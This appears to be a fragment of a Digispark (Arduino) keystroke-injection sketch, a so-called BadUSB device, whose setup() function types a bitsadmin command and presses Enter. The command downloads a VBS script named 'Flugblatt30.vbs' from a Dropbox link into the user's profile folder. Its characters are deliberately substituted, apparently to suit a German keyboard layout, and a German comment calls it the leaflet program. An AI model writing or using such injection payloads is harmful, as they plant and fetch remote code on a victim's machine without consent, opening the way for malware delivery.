...
void setup() {
  ...
  DigiKeyboard.print("bitsadmin &transfer wcb &prioritz high https>&&www.dropbox.com&s&zhcxe7naskxrh0v&Flugblatt30.vbs_dl)1 %USERPROFILE%&Flugblatt30.vbs");//Downloadet das Flugblatt-Programm 
  DigiKeyboard.delay(600);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
